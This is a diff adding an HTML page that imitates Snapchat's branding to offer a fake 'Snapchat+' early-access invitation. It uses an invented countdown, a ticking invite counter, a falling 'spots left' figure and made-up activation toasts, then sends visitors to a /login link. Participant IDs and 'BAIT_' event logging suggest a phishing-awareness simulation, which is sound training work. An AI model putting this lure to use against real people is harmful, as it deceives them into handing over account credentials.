@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html data-theme="dark" lang="fr">
+<head>
+<meta charset="utf-8">
+<meta content="width=device-width, initial-scale=1" name="viewport">
+<title>Snapchat+ | Acces anticipe</title>
+<link href="https://static.snapchat.com/accounts/_next/static/css/93a8779b219813a4.css" rel="stylesheet">
+<link href="https://static.snapchat.com/accounts/_next/static/css/754c88bc5ee181cf.css" rel="stylesheet">
+<link href="https://static.snapchat.com/accounts/_next/static/css/7d3d9cadfe7a162a.css" rel="stylesheet">
+<link href="/static/css/font.graphik.css" id="sdsm-font-graphik" rel="stylesheet">
+<style>
+.theme--snapchat .background--black,
+.theme--snapchat.background--black {
+--globalvar-basecolor-black-bg: #000000;
+--globalvar-basecolor-gray-bg: #F0F1F2;
+--globalvar-basecolor-white-bg: #FFFFFF;
+--globalvar-basecolor-yellow-bg: #FFFC00;
+--button-primary-bg: #FFFC00;
+--button-primary-color: #000000;
+--button-secondary-bg: #FFFFFF;
+--button-secondary-color: #000000;
+--button-flat-bg: #000000;
+--button-flat-color: #FFFFFF;
+--content-bg: #000000;
+--content-color: #FFFFFF;
+--content-subtitle-color: #FFFFFF;
+--hyperlink-color: #FFFFFF;
+--icon-color: #FFFFFF;
+}
+body {
+font-family: 'Graphik', Helvetica, Arial, sans-serif;
+background: #000;
+color: #fff;
+margin: 0;
+padding: 0;
+min-height: 100vh;
+display: flex;
+flex-direction: column;
+align-items: center;
+-webkit-font-smoothing: antialiased;
+}
+.page-wrapper {
+width: 100%;
+max-width: 420px;
+padding: 48px 24px;
+margin: 0 auto;
+display: flex;
+flex-direction: column;
+align-items: center;
+}
+.step { display: none; width: 100%; }
+.step.active { display: block; }
+.step { animation: fadeIn .35s ease; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+/* ghost */
+.ghost-wrap { text-align: center; margin-bottom: 24px; }
+.ghost-wrap svg { display: inline-block; }
+
+/* badge */
+.beta-badge {
+display: inline-block;
+background: rgba(255,252,0,0.12);
+color: #FFFC00;
+font-size: 12px;
+font-weight: 600;
+letter-spacing: 1px;
+padding: 5px 14px;
+border-radius: 100px;
+margin-bottom: 20px;
+text-transform: uppercase;
+}
+
+/* title */
+.title {
+font-size: 24px;
+font-weight: 600;
+line-height: 1.25;
+margin: 0 0 8px;
+text-align: center;
+color: #fff;
+}
+.subtitle {
+font-size: 14px;
+color: #AEB6BD;
+text-align: center;
+margin: 0 0 24px;
+line-height: 1.5;
+}
+
+/* divider */
+.divider {
+height: 1px;
+background: #2A2D30;
+margin: 24px 0;
+width: 100%;
+}
+
+/* perks */
+.perk-list { margin: 0 0 24px; }
+.perk {
+display: flex;
+align-items: flex-start;
+gap: 12px;
+padding: 14px 0;
+border-bottom: 1px solid #1E2124;
+}
+.perk:last-child { border-bottom: none; }
+.perk-icon {
+width: 36px;
+height: 36px;
+border-radius: 50%;
+background: rgba(255,252,0,0.1);
+display: flex;
+align-items: center;
+justify-content: center;
+flex-shrink: 0;
+font-size: 16px;
+}
+.perk-text {
+font-size: 14px;
+color: #AEB6BD;
+line-height: 1.4;
+}
+.perk-text strong {
+color: #E9EAEB;
+display: block;
+margin-bottom: 2px;
+font-weight: 500;
+}
+
+/* timer */
+.timer-section {
+text-align: center;
+margin: 0 0 24px;
+padding: 16px;
+background: #111316;
+border-radius: 12px;
+width: 100%;
+}
+.timer-label {
+font-size: 11px;
+font-weight: 600;
+color: #71757A;
+text-transform: uppercase;
+letter-spacing: 1px;
+margin-bottom: 10px;
+}
+.timer-bar {
+height: 4px;
+background: #2A2D30;
+border-radius: 4px;
+overflow: hidden;
+margin-bottom: 10px;
+}
+.timer-fill {
+height: 100%;
+background: #FFFC00;
+border-radius: 4px;
+width: 100%;
+transition: width 1s linear;
+}
+.timer-text {
+font-size: 13px;
+color: #71757A;
+}
+.timer-text span {
+color: #FFFC00;
+font-weight: 600;
+}
+
+/* social proof */
+.social-proof {
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 8px;
+font-size: 13px;
+color: #71757A;
+margin-bottom: 20px;
+}
+.social-proof .avatars {
+display: flex;
+}
+.social-proof .avatars span {
+width: 24px;
+height: 24px;
+border-radius: 50%;
+background: #2A2D30;
+display: flex;
+align-items: center;
+justify-content: center;
+font-size: 11px;
+margin-right: -6px;
+border: 2px solid #000;
+color: #AEB6BD;
+}
+.social-proof strong { color: #E9EAEB; font-weight: 500; }
+
+/* spots */
+.spots {
+text-align: center;
+font-size: 13px;
+color: #FFFC00;
+margin-bottom: 20px;
+font-weight: 500;
+}
+
+/* button */
+.btn {
+display: block;
+width: 100%;
+padding: 14px 24px;
+background: #FFFC00;
+color: #000;
+border: none;
+border-radius: 100px;
+font-size: 16px;
+font-weight: 600;
+cursor: pointer;
+text-decoration: none;
+text-align: center;
+transition: background .15s, transform .1s;
+font-family: 'Graphik', Helvetica, Arial, sans-serif;
+}
+.btn:hover { background: #FFD301; }
+.btn:active { transform: scale(0.97); }
+.btn-loading { opacity: 0.6; pointer-events: none; }
+.btn .spinner { display: none; width: 20px; height: 20px; border: 2px solid rgba(0,0,0,0.15); border-top-color: #000; border-radius: 50%; animation: spin .7s linear infinite; margin: 0 auto; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.btn.loading .btn-text { display: none; }
+.btn.loading .spinner { display: block; }
+
+/* check icon result */
+.result-icon {
+width: 64px;
+height: 64px;
+border-radius: 50%;
+background: rgba(255,252,0,0.12);
+display: flex;
+align-items: center;
+justify-content: center;
+margin: 0 auto 20px;
+font-size: 30px;
+}
+.final-cta { margin-top: 8px; }
+.fineprint {
+font-size: 11px;
+color: #53575B;
+text-align: center;
+margin-top: 20px;
+line-height: 1.5;
+}
+
+/* toasts notif */
+.notif-toast {
+position: fixed;
+bottom: 24px;
+left: 50%;
+transform: translateX(-50%);
+background: #1E2124;
+border: 1px solid #2A2D30;
+border-radius: 12px;
+padding: 12px 16px;
+display: flex;
+align-items: center;
+gap: 10px;
+font-size: 13px;
+color: #AEB6BD;
+max-width: 360px;
+width: 90%;
+opacity: 0;
+transition: opacity .4s;
+pointer-events: none;
+z-index: 1000;
+}
+.notif-toast.show { opacity: 1; }
+.notif-toast .dot {
+width: 28px;
+height: 28px;
+border-radius: 50%;
+background: #2A2D30;
+display: flex;
+align-items: center;
+justify-content: center;
+flex-shrink: 0;
+font-size: 13px;
+}
+.notif-toast .name { color: #E9EAEB; font-weight: 500; }
+.notif-toast .time { color: #53575B; }
+
+/* stars bg */
+#bg-stars {
+position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+pointer-events: none; z-index: 0; overflow: hidden;
+}
+#bg-stars i {
+position: absolute;
+width: 2px; height: 2px;
+background: rgba(255,255,255,0.06);
+border-radius: 50%;
+animation: twinkle 4s ease-in-out infinite;
+}
+@keyframes twinkle {
+0%, 100% { opacity: 0.15; }
+50% { opacity: 0.7; }
+}
+
+/* confetti */
+#confetti-wrap {
+position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+pointer-events: none; z-index: 999; overflow: hidden;
+}
+.confetti {
+position: absolute; top: -10px; width: 7px; height: 7px;
+border-radius: 2px;
+animation: fall linear forwards;
+}
+@keyframes fall {
+0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+}
+
+/* responsive */
+@media (max-width: 480px) {
+.page-wrapper { padding: 32px 20px; }
+.title { font-size: 22px; }
+.btn { padding: 13px 20px; font-size: 15px; }
+}
+</style>
+</head>
+<body>
+
+<div id="bg-stars"></div>
+
+<div class="page-wrapper">
+
+<!-- STEP 1: Invitation -->
+<div class="step active" id="step1">
+<div class="ghost-wrap">
+<svg width="60" height="60" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 38 38" data-testid="GhostIconFilled">
+<path d="M35.8336 26.7701C35.6786 26.2535 34.9294 25.8918 34.9294 25.8918C34.8623 25.8505 34.7951 25.8195 34.7434 25.7936C33.4983 25.1943 32.3978 24.471 31.473 23.6495C30.7291 22.9882 30.0884 22.2649 29.5769 21.49C28.9518 20.5497 28.6573 19.7592 28.5333 19.3355C28.461 19.0565 28.4765 18.948 28.5333 18.8034C28.585 18.6846 28.7245 18.5657 28.7968 18.5141C29.2153 18.2196 29.8921 17.7804 30.3054 17.5118C30.6619 17.2793 30.9719 17.0778 31.1527 16.9538C31.7365 16.5456 32.1344 16.1323 32.372 15.6828C32.6768 15.1042 32.713 14.4635 32.4753 13.8384C32.155 12.9911 31.3645 12.4848 30.3622 12.4848C30.1401 12.4848 29.9076 12.5106 29.6803 12.5571C29.1068 12.6811 28.5591 12.8878 28.1045 13.0634C28.0735 13.0789 28.0373 13.0531 28.0373 13.0169C28.0838 11.8855 28.1407 10.3665 28.0167 8.9199C27.903 7.61278 27.6343 6.51232 27.1952 5.55135C26.7509 4.58522 26.1826 3.87225 25.7279 3.36076C25.2991 2.86995 24.55 2.14664 23.4133 1.49566C21.8169 0.581195 19.9983 0.116211 18.0092 0.116211C16.0253 0.116211 14.2118 0.581195 12.6102 1.4905C11.4116 2.17764 10.6418 2.95261 10.2905 3.3556C9.84097 3.87225 9.26749 4.58522 8.82317 5.54619C8.38402 6.50715 8.11536 7.60761 8.0017 8.91473C7.8777 10.3614 7.92937 11.7615 7.98103 13.0118C7.98103 13.0479 7.94487 13.0738 7.91387 13.0583C7.45922 12.8826 6.91157 12.6759 6.33809 12.5519C6.11076 12.5003 5.88344 12.4796 5.65611 12.4796C4.65382 12.4796 3.86334 12.9859 3.54302 13.8332C3.30536 14.4635 3.34153 15.099 3.64635 15.6777C3.88401 16.1271 4.28183 16.5405 4.86564 16.9486C5.04647 17.0726 5.35646 17.2741 5.71295 17.5066C6.1211 17.7701 6.77724 18.1937 7.19573 18.4934C7.24739 18.5296 7.42305 18.6639 7.47988 18.8034C7.54188 18.9532 7.55221 19.0617 7.47472 19.3562C7.34555 19.785 7.05107 20.5652 6.43625 21.49C5.92477 22.2649 5.28413 22.9882 4.54015 23.6495C3.61019 24.471 2.50972 25.1943 1.26977 25.7936C1.21294 25.8195 1.14061 25.8556 1.06311 25.9021C0.985611 25.9486 0.319134 26.2793 0.179639 26.7701C-0.0270202 27.4934 0.520627 28.1702 1.08894 28.537C2.00858 29.1312 3.10004 29.6487 3.73876 29.9024L3.86876 29.9532C4.23246 30.0937 4.54658 30.2043 4.82309 30.2906C4.61374 31.0361 4.46451 31.5478 4.38547 31.7863C4.08065 32.6192 4.12675 33.5408 4.50137 34.334C4.87268 35.1314 5.4747 35.7518 6.21399 36.1316L6.45631 36.2491L6.69663 36.3708C8.36505 37.1759 10.2493 37.4054 11.0285 37.4054C11.8077 37.4054 12.5541 37.2101 13.1648 36.897C13.4408 36.7496 13.6852 36.5735 13.8982 36.3756C14.4614 37.0055 15.5546 37.4054 16.4843 37.4054H16.6393C16.8189 37.4054 17.0073 37.3843 17.1992 37.3466C17.3501 37.5266 17.514 37.6858 17.6894 37.821C18.4874 38.4273 19.456 38.3758 20.2624 37.842C20.4446 37.7194 20.6091 37.5767 20.7557 37.4179C20.9539 37.4533 21.1483 37.473 21.3358 37.473H21.4908C22.4205 37.473 23.5129 37.073 24.076 36.4432C24.2876 36.6414 24.5322 36.8175 24.8083 36.9649C25.4191 37.278 26.1654 37.4733 26.9447 37.4733C27.7239 37.4733 29.6081 37.2438 31.2766 36.4387L31.5169 36.317L31.7592 36.1995C32.4985 35.8197 33.1005 35.1993 33.4718 34.4019C33.8465 33.6087 33.8926 32.6871 33.5877 31.8542C33.5079 31.6158 33.3595 31.1066 33.1525 30.3643C33.4251 30.2781 33.7361 30.1683 34.0982 30.0284L34.2346 29.9752C34.8733 29.7215 35.9647 29.204 36.8844 28.6102C37.4527 28.2435 38.0004 27.5667 37.7937 26.8434L37.7935 26.8429C37.6385 26.3263 36.8893 25.9646 36.8893 25.9646C36.8221 25.9233 36.755 25.8923 36.7033 25.8664C36.6408 25.9017 36.5805 25.9398 36.5232 25.9814C36.5206 25.9833 36.5176 25.9853 36.5142 25.9876L36.5077 25.9924L36.5235 25.9461Z" fill="#FFFC00"/>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M36.5235 25.9461C37.097 26.2664 37.5982 26.6487 37.8617 27.3669C38.1613 28.1677 37.9805 29.0821 37.2572 29.8571L37.2468 29.8675C36.9885 30.1619 36.6527 30.4203 36.2291 30.6528C35.2681 31.1849 34.4569 31.4381 33.8215 31.6137C33.7026 31.6499 33.4753 31.7326 33.372 31.8204C33.2274 31.9443 33.1671 32.1036 33.0919 32.3021C33.0354 32.4512 32.9706 32.6225 32.8553 32.8175C32.6073 33.2412 32.3025 33.5202 32.0545 33.6907C31.2737 34.23 30.401 34.2638 29.4719 34.2997L29.4558 34.3003C28.6085 34.3313 27.6527 34.3675 26.5626 34.7291C26.1428 34.8674 25.6994 35.1379 25.1872 35.4503C25.1636 35.4647 25.1399 35.4792 25.1159 35.4938C23.8037 36.2997 22.0006 37.4054 19.004 37.4054C16.0116 37.4054 14.2248 36.3079 12.913 35.5023L12.9075 35.4989C12.3651 35.1631 11.8949 34.8738 11.4403 34.724C10.345 34.3623 9.38916 34.3261 8.54703 34.2951L8.53096 34.2945C7.60183 34.2586 6.72909 34.2249 5.94829 33.6855C5.73129 33.5408 5.47297 33.3083 5.24564 32.9725C5.06076 32.7066 4.97644 32.4816 4.90565 32.2928C4.83204 32.0964 4.77306 31.939 4.63083 31.8152C4.51717 31.7171 4.25885 31.6344 4.15035 31.6034C3.52004 31.4277 2.71407 31.1746 1.77377 30.6528C1.37595 30.4306 1.05563 30.1929 0.802467 29.9191C0.0326611 29.1286 -0.168832 28.1935 0.135991 27.3669C0.479982 26.4363 1.22301 26.0629 2.00197 25.6715C2.13556 25.6044 2.27021 25.5367 2.40408 25.4656C4.12968 24.5305 5.4833 23.3577 6.42877 21.9731C6.74392 21.5081 6.97125 21.0844 7.12624 20.7383C7.21407 20.4851 7.21407 20.3508 7.15208 20.2216C7.10041 20.1131 6.94025 19.9943 6.89375 19.9633C6.65756 19.8058 6.41473 19.6484 6.22122 19.5229C6.17346 19.4919 6.12869 19.4629 6.08778 19.4363C5.70546 19.1883 5.40581 18.992 5.20948 18.8577C4.47584 18.3462 3.96436 17.8037 3.64403 17.1941C3.19455 16.3364 3.13772 15.3548 3.48387 14.4352C3.96952 13.159 5.17848 12.3634 6.64059 12.3634C6.94542 12.3634 7.25541 12.3944 7.56023 12.4616" fill="#FFFC00"/>
+</svg>
+</div>
+
+<div class="beta-badge">Acces anticipe</div>
+<h1 class="title">Invitation Snapchat+</h1>
+<p class="subtitle">Vous avez ete selectionne pour tester Snapchat+ en avant-premiere. Profitez de fonctionnalites exclusives avant tout le monde.</p>
+
+<div class="social-proof">
+<div class="avatars">
+<span>👤</span><span>👤</span><span>👤</span>
+</div>
+<div><strong id="liveCount">1,284</strong> invites aujourd'hui</div>
+</div>
+
+<div class="perk-list">
+<div class="perk">
+<div class="perk-icon">⭐</div>
+<div class="perk-text"><strong>Fonctionnalites premium</strong>Acces aux stickers, themes et lenses exclusifs Snapchat+</div>
+</div>
+<div class="perk">
+<div class="perk-icon">👁️</div>
+<div class="perk-text"><strong>Vue illimitee</strong>Sachez exactement qui consulte votre profil et vos stories</div>
+</div>
+<div class="perk">
+<div class="perk-icon">💬</div>
+<div class="perk-text"><strong>Replay illimite</strong>Re-regardez les snaps autant de fois que vous le souhaitez</div>
+</div>
+</div>
+
+<div class="timer-section">
+<div class="timer-label">Offre expire dans</div>
+<div class="timer-bar"><div class="timer-fill" id="timerFill"></div></div>
+<div class="timer-text"><span id="countdown">24:00</span> restantes</div>
+</div>
+
+<div class="spots" id="spotsLine">Plus que <span id="spotsCount">4</span> invitations pour votre region</div>
+
+<button class="btn" id="checkBtn">
+<span class="btn-text">Verifier mon eligibilite</span>
+<span class="spinner"></span>
+</button>
+
+<p class="fineprint">Verification instantanee. Aucun engagement requis.</p>
+</div>
+
+<!-- STEP 2: Eligible -->
+<div class="step" id="step2">
+<div class="result-icon">✓</div>
+<h1 class="title">Vous etes eligible</h1>
+<p class="subtitle">Votre compte est selectionne pour le programme Snapchat+ Beta. Activez votre acces gratuit avant la fin de l'offre.</p>
+
+<div class="divider"></div>
+
+<div class="perk-list">
+<div class="perk">
+<div class="perk-icon">⭐</div>
+<div class="perk-text"><strong>Badge Snapchat+</strong>Un badge exclusif visible sur votre profil</div>
+</div>
+<div class="perk">
+<div class="perk-icon">👁️</div>
+<div class="perk-text"><strong>Vue des visiteurs</strong>Qui consulte votre profil et vos stories</div>
+</div>
+<div class="perk">
+<div class="perk-icon">💬</div>
+<div class="perk-text"><strong>Replay illimite</strong>Re-regardez les snaps sans limite</div>
+</div>
+<div class="perk">
+<div class="perk-icon">🔥</div>
+<div class="perk-text"><strong>Snapstreak Boost</strong>Vos snaps en priorite dans la boite de reception</div>
+</div>
+</div>
+
+<div class="spots" id="spotsLine2">Plus que <span id="spotsCount2">4</span> places avant cloture du programme</div>
+
+<div class="final-cta">
+<a href="/login" class="btn" id="activateBtn">
+<span class="btn-text">Activer mon acces Snapchat+</span>
+</a>
+</div>
+
+<p class="fineprint">Connexion securisee. En continuant, vous acceptez les conditions d'utilisation de Snapchat+.</p>
+</div>
+
+</div>
+
+<div class="notif-toast" id="notifToast">
+<div class="dot">👤</div>
+<div><span class="name" id="notifName">Sophie</span> a active Snapchat+ <span class="time" id="notifTime">il y a 27s</span></div>
+</div>
+
+<script>
+(function(){
+var pid = '{{ participant_id }}';
+sessionStorage.setItem('participant_id', pid);
+
+var names = ['Sophie','Lucas','Emma','Hugo','Lea','Nathan','Manon','Enzo','Jade','Mathis','Camille','Sarah','Alex','Marie','Julien','Ines','Tom','Lola','Maxime','Clara'];
+var count = 1284;
+var spots = 4;
+
+function log(e){ fetch('/api/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event:e,participant_id:pid})}).catch(function(){}) }
+
+// stars bg
+(function(){
+var c=document.getElementById('bg-stars');
+for(var i=0;i<50;i++){
+var s=document.createElement('i');
+s.style.left=Math.random()*100+'%';
+s.style.top=Math.random()*100+'%';
+s.style.animationDelay=Math.random()*4+'s';
+s.style.width=s.style.height=(Math.random()*1.5+1)+'px';
+c.appendChild(s);
+}
+})();
+
+// social proof ticker
+setInterval(function(){
+count+=Math.floor(Math.random()*2)+1;
+document.getElementById('liveCount').textContent=count.toLocaleString();
+},6000+Math.random()*4000);
+
+// spots
+setInterval(function(){
+spots=Math.max(1,spots-(Math.random()<0.3?1:0));
+['spotsCount','spotsCount2'].forEach(function(id){document.getElementById(id).textContent=spots});
+},10000+Math.random()*5000);
+
+// timer (persiste au refresh via sessionStorage)
+var timerStart=parseInt(sessionStorage.getItem('bait_timer_start')||'0',10);
+if(!timerStart){timerStart=Date.now();sessionStorage.setItem('bait_timer_start',timerStart)}
+function updateTimer(){
+var elapsed=Math.floor((Date.now()-timerStart)/1000);
+var total=Math.max(0,24*60-elapsed);
+var m=Math.floor(total/60),s=total%60;
+document.getElementById('countdown').textContent=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+document.getElementById('timerFill').style.width=(total/(24*60))*100+'%';
+if(total<=0){document.getElementById('countdown').textContent='00:00'}
+}
+updateTimer();
+setInterval(updateTimer,1000);
+
+// toast notifs
+function showToast(){
+var t=document.getElementById('notifToast');
+document.getElementById('notifName').textContent=names[Math.floor(Math.random()*names.length)];
+var sec=Math.floor(Math.random()*45)+5;
+document.getElementById('notifTime').textContent='il y a '+sec+'s';
+t.classList.add('show');
+setTimeout(function(){t.classList.remove('show')},4500);
+}
+showToast();
+setInterval(showToast,12000+Math.random()*10000);
+
+// step 1 -> step 2
+document.getElementById('checkBtn').addEventListener('click',function(){
+var btn=this;
+btn.classList.add('loading');
+btn.disabled=true;
+log('BAIT_CHECK');
+setTimeout(function(){
+document.getElementById('step1').classList.remove('active');
+document.getElementById('step2').classList.add('active');
+log('BAIT_ELIGIBLE');
+// confetti
+var w=document.createElement('div');
+w.id='confetti-wrap';
+var cols=['#FFFC00','#fff','#2E86DE','#FF6B6B','#A29BFE','#FD79A8'];
+for(var i=0;i<50;i++){
+var p=document.createElement('div');
+p.className='confetti';
+p.style.left=Math.random()*100+'%';
+p.style.background=cols[Math.floor(Math.random()*cols.length)];
+p.style.width=(Math.random()*5+4)+'px';
+p.style.height=(Math.random()*5+4)+'px';
+p.style.borderRadius=Math.random()>0.5?'50%':'2px';
+p.style.animationDuration=(Math.random()*2+1.5)+'s';
+p.style.animationDelay=(Math.random()*0.6)+'s';
+w.appendChild(p);
+}
+document.body.appendChild(w);
+setTimeout(function(){if(w.parentNode)w.remove()},4000);
+},2200);
+});
+
+document.getElementById('activateBtn').addEventListener('click',function(){log('BAIT_ACTIVATE')});
+
+log('BAIT_VIEW');
+})();
+</script>
+</body>
+</html>
